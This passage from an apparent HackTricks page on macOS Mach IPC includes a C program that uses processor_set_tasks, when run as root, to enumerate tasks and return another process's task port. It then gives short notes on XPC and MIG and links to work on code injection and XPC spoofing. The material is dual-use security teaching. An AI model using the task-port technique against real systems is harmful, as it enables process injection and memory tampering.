आजकल, उस फ़ंक्शन का उपयोग करने के लिए आपको रूट की आवश्यकता है और यह सुरक्षित है, इसलिए आप केवल असुरक्षित प्रक्रियाओं पर इन पोर्ट्स को प्राप्त कर सकेंगे।

आप इसे आजमा सकते हैं:

<details>

<summary><strong>processor_set_tasks कोड</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
